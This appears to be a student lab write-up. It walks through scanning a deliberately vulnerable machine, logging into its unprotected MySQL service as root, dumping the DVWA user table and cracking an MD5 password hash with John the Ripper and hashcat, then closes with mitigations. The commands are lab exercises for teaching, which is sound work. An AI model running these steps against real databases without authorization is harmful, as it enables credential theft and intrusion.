## **Ingredients Needed**

| Tool        | Use                               |
| ----------- | --------------------------------- |
| `OpenSSL`   | Check supported SSL/TLS           |
| `nmap`      | Port scanning & service detection |
| `nc`        | Quick port scan                   |
| `mysql`     | Access and enumeration            |
| `hashid`    | Identify hash types               |
| `john`      | Cracking password hashes          |
| `hashcat`   | GPU-based hash cracking           |
| `Wireshark` | Network traffic analysis          |

<br/>

## **Lab Setup </br>**

- **Attacker Machine**: Kali Linux
- **Target**: Vulnerable machine running an exposed database service</br></br>

---

## **Task 1: Service Enumeration and Initial Access**

### **1.1 Finding the Target IP**

```bash
netdiscover
```

- Scans your local subnet for live devices.
- Helps you find IPs and MAC addresses </br> </br> </br>

---

<br>

```bash
nmap -sS -sV -p- <Target IP>
```

- `-sS`: SYN scan (stealthy)
- `-sV`: Service version detection
- `-p-`: Scan all 65535 TCP ports

‚ö†Ô∏è Since this command run scans on **all ports** it will require a long time to finish

---

<br>

So instead we shortlist the ports that ae commonly used or jut the one we want

```sh
sudo nmap -sS -sV -p 21,22,23,25,80,111,139,445,512-515,3306,5432,5900,6000 192.168.204.147
```

Discovered port **3306** open ‚Üí MySQL service detected.

---

#### Alternative

```bash
nc -zv <Target IP> <ports>
```

- `-z`: Scan without sending data
- `-v`: Verbose output

Not stealthy (full TCP handshake), better for basic connectivity check.

<br/>

---

### 1.2 OpenSSL Check for Encryption

```bash
openssl s_client -connect <target IP>:3306 -quiet
```

- `openssl` : The OpenSSL command-line tool for cryptographic operations
- `s_client` : A subcommand used to act as an SSL/TLS client and connect to a remote server
- `-connect <target IP>:3306` : Specifies the target IP and port to test (here, port 3306 for MySQL).

#### Optional

- `-quiet` : Suppresses verbose output (e.g., certificate details), showing only critical errors or success messages.

---

### Results

It tests whether the target service (e.g., MySQL) supports SSL/TLS encryption on port 3306.

- If SSL/TLS is **enabled and configured**, you‚Äôll see a **successful SSL handshake** and _certificate details_.

- If SSL/TLS is **not supported**, you‚Äôll get an **error** (e.g., no peer certificate available or SSL3_GET_RECORD: wrong version number).

---

### **1.3 Connection Attempt**

```bash
mysql -h <Target IP> -u root
```

Running this command will attempt a connection to the MySQL service

<br>

---

### **‚ö†Ô∏è Problem Encountered ‚ö†Ô∏è**

‚ö†Ô∏è Running this command will result in error

**`ERROR 2026 (HY000): TLS/SSL error: wrong version number`**

This is due to the mismatch in SSL/TLS versions

---

### ‚úÖ **Solution** ‚úÖ

But we can bypas
s/fix this by adding this at the end of the command

- `--ssl=0`

  OR

- `--ssl-mode=DISABLED`

<br>

Running this command will result in a success connection to MySQL

```sh
mysql -h 192.168.204.147 -u root --ssl=0
```

OR

```sh
mysql -h 192.168.204.147 -u root --ssl=DISABLED
```

üí•We have successfully entered the **Database** of **MySQL** service üí•

<br/>

---

<br/>

## Task 2: Enumeration of Users and Authentication Weakness

### Enumeration

1. Enter MySQL database

```sql
USE mysql
```

2. Lets see what MySQL contents

```sql
SHOW TABLES;
```

3. Find the required info

```sql
SELECT host, user, password FROM user;
```

OR

```sql
SELECT * FROM mysql.user;
```

To direcly show the required info from MySQL **user** table

---

### üî¥ Result üî¥

After obtainin the oh sweet data from MySQL database, you can see that the **users** dont have any **password configured**, allowing anyone to gain access to the database, which is worsen by the fact that it can be entered by **any hosts**

**TLDR**

- Empty space in `Password` column means no password configured
- `%` symbol mean that it can be entered from any IPs
- Every privilage column is labeled `Y` or Yes means that all data can be modified

---

### ‚≠ê ‚ùîQuestion: Is no password a cryptographic failure? ‚ùî ‚≠ê

**Yes.** It completely bypasses cryptographic authentication. A secure system must require password hashing + proper access control.

---

<br/>

## Task 3: Password Hash Discovery and Hash Identification

Now that we know MySQL dont have anypassword, lets find a Databasewhich has one, in this case **`DVWA`** or `Damn Vulnerable Web Application`

1. Enter DVWA database

```sql
USE dvwa
```

Now that we're in the database, Lets start digging ‚õèÔ∏è

2. Lets see what DVWA hiding üëÄ üòà

```sql
SHOW TABLES;
```

3. Find the required info

```sql
SELECT * FROM users;
```

OR

```sql
SELECT * FROM dvwa.users;
```

---

### üî¥ Results üî¥

From the picture, we can see that the users from dvwa has passwords configure unlike MySQL, but you dont understand it, do you?

This is because the password is encrypted, unabling us from seeing the real password

Now that you understands, lets move on

---

### 3.1 Extract the Hash

Lets choose Bob/Smithy as our target, why? Cause I feel like doing so ü§£

The extracted hashes:

```text
5f4dcc3b5aa765d61d8327deb882cf99
```

### 3.2 Identify the Hash

We can use:

- `hashid`
- `hash-identifier`

```sh
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
```

We can see that it show many posibilities of hash, so we need to check the characteristic of the hash we extracted

- 32 characters
- Digits‚ÄØ0‚Äì9 and lowercase letters‚ÄØa‚Äìf only (hexadecimal)
- It is just the 32‚Äëchar string‚Äîno \*, no $, no colons
- Typically lowercase (uppercase works too, but apps usually store lowercase)

### Rule of thumb üëç

| Characteristic                              | Hash                                  |
| ------------------------------------------- | ------------------------------------- |
| 32‚Äëchar hex hash from an old PHP/MySQL app? | ‚Üí assume MD5.                         |
| Starts with \* and 40 hex chars?            | ‚Üí MySQL¬†4.1+ SHA‚Äë1 (\*94BDCE...).     |
| Starts with $1$, $6$, etc.?                 | ‚Üí Linux shadow hashes (MD5, SHA‚Äë512). |
| Upper‚Äëcase 32‚Äëchar hex split by :?          | ‚Üí LM/NTLM.                            |

---

- Result: **MD5 Crypt**
- Weak due to collision resistance and speed (fast to brute-force)

---

<br/>

## **Task 4: Offline Hash Cracking**

Now we arrived a the best part, craking it down

First off, save the hash to a file

```sh
echo 5f4dcc3b5aa765d61d8327deb882cf99 > hash.txt
```

### 4.1 Using John the Ripper

```bash
john --wordlist=<wordlist> hash.txt
```

---

### ‚ö†Ô∏è Problem Encountered ‚ö†Ô∏è

When running the code above, you will encounter the error

- `Warning: detected hash type "LM", but the string is also recognized as "dynamic=md5($p)"`

This is caused by the hash being MD5, and we didnt specify the format we want to use, so it wouldnt know which format to use and would defaulted to using LM format to crack it

---

### ‚úÖ Solution ‚úÖ

This can be solved/fixed by adding the correct/wanted format to the command

- For MD5:

```sh
john --format=raw-md5 --wordlist=<wordlist> hash.txt
```

By using this command, we can see that the cracking was successful, thus showing us the treasure behind the hash

- Cracked password: `password`

### 4.2 Using Hashcat (alternative)

```bash
hashcat -m 0 -a 0 hash.txt password.txt
```

- `-m 0`: for Raw MD5 Crypt
- `-a 0`: Dictionary attack

---

### Additional Information

---

### **To view cracked hash**

John the Ripper

- John stores the cracked hashes in the john.pot file

```sh
john --show hash.txt
```

Hashcat

- Hashcat stores cracked hashes in the hashcat.potfile

```sh
hashcat -m 0 -a 0 --show hash.txt
```

### **To clear stored cracked hash**

John the Ripper

- To clear the cracked hashes from the john.pot file, simply delete the john.pot file:

```sh
rm ~/.john/john.pot
```

Hashcat

- To clear the cracked hashes from the hashcat.potfile, delete the file:

```sh
rm ~/.hashcat/hashcat.potfile
```

## **Task 5: Cryptographic Analysis and Mitigation**

### Issues Found

- No password on some accounts
- Weak password hashes (MD5 Crypt)
- Potential plaintext transmission

### Solutions

- Enforce strong password policy
- Use secure hash functions (e.g., bcrypt, Argon2)
- Enable SSL/TLS for database communication

### **Task 6: Wireshark Analysis**

**6.1 Heating up the oven**

1. Fire up `Wireshark`
2. Choose the interface that oyu want to capture ( Example: eth0 )
3. Add a display filter

```bash
mysql || tcp.port == 3306
```

4. Start Capturing

**6.2 Generate Traffic**

1. Open a second terminal and log in without SSL

```sh
mysql -h 192.168.204.147 -u root --ssl=0
```

**6.3 Stop capture & locate the login packet**

1. Look for a packet labeled ‚ÄúLogin Request‚Äù or just the first packet from client ‚Üí server after SYN/ACK

2. Expand MySQL Protocol ‚Ä∫ Login Request.

---

## Conclusion

This lab showed how poor cryptographic practices (empty passwords, weak hashes, no SSL) can easily be exploited. Stronger authentication, hashing, and encrypted communication are essential to secure systems.
